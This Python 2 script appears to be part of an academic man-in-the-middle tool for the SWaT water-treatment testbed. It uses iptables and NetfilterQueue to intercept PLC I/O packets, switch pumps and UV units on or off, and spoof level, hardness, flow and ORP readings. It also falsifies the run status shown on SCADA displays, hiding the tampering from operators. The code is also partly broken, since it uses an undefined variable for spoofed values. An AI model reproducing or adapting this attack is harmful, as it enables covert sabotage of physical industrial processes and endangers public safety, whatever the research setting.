#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2019  Beebi Siti Salimah Binte Liyakkathali, liyakkathali@sutd.edu.sg
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER

# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

#Last modified on: 02 May 2019

# Script part of A6_L0 Mitm tool: https://github.com/ibmilo/A6-L0-MITM
# Some attributes to 	https://github.com/ifyouaretea/A6-MITM
#			https://github.com/scy-phy/swat




import datetime
import ctypes
from time import sleep
from time import time as ts
import signal
import os
import sys
from netfilterqueue import NetfilterQueue
from scapy import all as scapy_all
from scapy.layers.inet import IP
from scapy.layers.inet import UDP

from _PLC4 import SWAT_P4_RIO_DO, SWAT_P4_RIO_DI, SWAT_P4_RIO_AI

from scaling_all import P1Flow, P1Level, P2Flow, P2Cond, P2Ph, P2Orp, P3Level, P3Flow, P3DPress, \
                    P4Level, P4Hrdss, P4Flow, P4Orp, \
                    P5FeedPh, P5FeedOrp, P5FeedCond, P5PremCond, P5FeedFlow, P5PermFlow,\
                    P5ConcFlow, P5RecFlow, P5HPumpPress, P5PermPress, P5ConcPress,\
                    P6BackFlow, current_to_signal, signal_to_current


global toggle_flag
global current_spoofed

device_type = []
device_tag = []
value = []
scada = []


class attack_P4_level0:

    toggle_flag = False
 

    def __init__(self):
        self.toggle_flag = False


    def start(self):
        self.nfqueue = NetfilterQueue()
        os.system('sudo iptables -t mangle -A PREROUTING -s 192.168.0.42,192.168.0.40 -p udp --dport 2222 -j NFQUEUE --queue-num 2')
        self.nfqueue.bind(2, self._launch_P4_attack,10)
        self.nfqueue.run()
        print('***********************inject start******************************')


    def stop(self): 
        os.system('sudo iptables -t mangle -F')
        self.nfqueue.unbind()
        print('*** STOPPING IPTABLES ***')

     #change the DO packets
    def _launch_P4_attack(self,packet):
        global device_tag
        global value 
        global scada

        length = len(device_tag)
        ind = 0
        pkt = IP(packet.get_payload())
        

        while ind < length:

            dev = device_tag[ind]
            val = value[ind]
            sca = scada [ind]

            if SWAT_P4_RIO_DO in pkt:

              if dev  == "P401":
                  pkt[SWAT_P4_RIO_DO].P401_Start = val
              
              elif dev  == "P402":
                  pkt[SWAT_P4_RIO_DO].P402_Start = val
              
              elif dev  == "P403":
                  pkt[SWAT_P4_RIO_DO].P403_Start = val

              elif dev  == "P404":
                  pkt[SWAT_P4_RIO_DO].P404_Start = val

              elif dev == "UV401":
              	pkt[SWAT_P4_RIO_DO].UV_Start = val

              else: 
                print "Device tag  error"

                    
            if SWAT_P4_RIO_DI in pkt:

              if dev  == "P401":
                  pkt[SWAT_P4_RIO_DI].P401_Run = sca
              
              elif dev  == "P402":
                  pkt[SWAT_P4_RIO_DI].P402_Run = sca
              
              elif dev  == "P403":
                  pkt[SWAT_P4_RIO_DI].P403_Run = sca

              elif dev  == "P404":
                  pkt[SWAT_P4_RIO_DI].P404_Run = sca

              elif dev == "UV401":
                pkt[SWAT_P4_RIO_DI].UV401_Run = sca

              elif  dev == "LS401":
               # print pkt[SWAT_P4_RIO_DI].LS401_Low
                #pkt[SWAT_P4_RIO_DI].LS401_Low = sca
                #print sca
                pkt[SWAT_P4_RIO_DI].LS401_Low = sca

                
               

              else: 
                print "Device tag error"



            if SWAT_P4_RIO_AI in pkt:

              if dev == "LIT401":
              	self.true_measurement_P4_level =  current_to_signal(pkt[SWAT_P4_RIO_AI].LIT401_Level, P4Level)  #scaling
                
              	if(self.toggle_flag == False):
              		spoofed_measurement = self.true_measurement_P4_level
              		self.toggle_flag = True

              	if(self.toggle_flag):
              		spoofed_measurement = mutate_valve
              		current_spoofed = signal_to_current(spoofed_measurement, P4Level) 
              		pkt[SWAT_P4_RIO_AI].LIT401_Level =  current_spoofed

              		print('LIT401 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P4_level,spoofed_measurement))


              if dev == "AIT401":
              	self.true_measurement_P4_hard =  current_to_signal(pkt[SWAT_P4_RIO_AI].AIT401_Hardness, P4Hrdss)  #scaling

              	if(self.toggle_flag == False):
              		spoofed_measurement = self.true_measurement_P4_hard
              		self.toggle_flag = True

              	if(self.toggle_flag):
              		spoofed_measurement = mutate_valve
              		current_spoofed = signal_to_current(spoofed_measurement, P4Hrdss) 
              		pkt[SWAT_P4_RIO_AI].AIT401_Hardness =  current_spoofed

              		print('AIT401 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P4_hard,spoofed_measurement))


              if dev == "FIT401":
              	self.true_measurement_P4_flow =  current_to_signal(pkt[SWAT_P4_RIO_AI].FIT401_Flow, P4Flow)  #scaling

              	if(self.toggle_flag == False):
              		spoofed_measurement = self.true_measurement_P4_flow
              		self.toggle_flag = True

              	if(self.toggle_flag):
              		spoofed_measurement = mutate_valve
              		current_spoofed = signal_to_current(spoofed_measurement, P4Flow) 
              		pkt[SWAT_P4_RIO_AI].FIT401_Flow =  current_spoofed

              		print('FIT401 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P4_flow,spoofed_measurement))


              if dev == "AIT402":
              	self.true_measurement_P4_ORP =  current_to_signal(pkt[SWAT_P4_RIO_AI].AIT402_ORP, P4Orp)  #scaling

              	if(self.toggle_flag == False):
              		spoofed_measurement = self.true_measurement_P4_ORP
              		self.toggle_flag = True

              	if(self.toggle_flag):
              		spoofed_measurement = mutate_valve
              		current_spoofed = signal_to_current(spoofed_measurement, P4Orp) 
              		pkt[SWAT_P4_RIO_AI].AIT402_ORP =  current_spoofed

              		print('AIT402 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P4_ORP,spoofed_measurement))


            ind = ind +1
            del pkt[UDP].chksum  # Need to recompute checksum
            #pkt.show()
            packet.set_payload(str(pkt))

        packet.accept()

def start():

	attacker = attack_P4_level0();
	def signal_term_handler(signal, frame):
		print('*** STOPPING')
		attacker.stop()

	signal.signal(signal.SIGTERM, signal_term_handler)
	try:
		print('attacker is loaded')
		attacker.start()
		signal.pause()  # wait for a signal
	except KeyboardInterrupt:
		print('*** STOPPING')
		attacker.stop()

if __name__=='__main__':
    num_of_attacks = int(raw_input('Enter number of actuators attacks : '))

    for i in range (num_of_attacks) :
        print ("For Point %i >>>") % (i + 1)

        dev_type = raw_input('Enter device type to attack (e.g PUMP, AIT, VALVE) : ')

        dev_tag = raw_input('Enter tag  to attack (e.g P401, UV401, FIT401) : ')
      
        if dev_type == "PUMP" or dev_type == "VALVE" or dev_type == "LED" or dev_type == "UV":
          
           val =  int (raw_input('Enter value - ON (1) or OFF (0) : '))
           sca =  int (raw_input('Set SCADA display to - ON (1) or OFF (0) : '))
     

        elif dev_type == "FIT" or dev_type == "LIT" or dev_type == "AIT":
         
            val =  int (raw_input('Enter value to spoofed value : '))
            sca = 0

        elif dev_type == "SWITCH":
             sca =  int (raw_input('Enter SWITCH display - Not Low (1) or Low (0) : '))
             val =0 


        else:
            print "Device type not found"
            sys.exit()

        if dev_tag =="P401" or dev_tag == "P402" or dev_tag == "P403" or dev_tag == "P404" \
        or dev_tag == "LIT401" or dev_tag == "FIT401" or dev_tag == "UV401" or dev_tag == "AIT401" \
        or dev_tag == "AIT402" or dev_tag == "LS401" :

         
          device_type.append(dev_type)
          device_tag.append(dev_tag)
          value.append(val)
          scada.append(sca)
          
        else:

          print "Device tag not found"
          sys.exit()

    sys.exit(start())









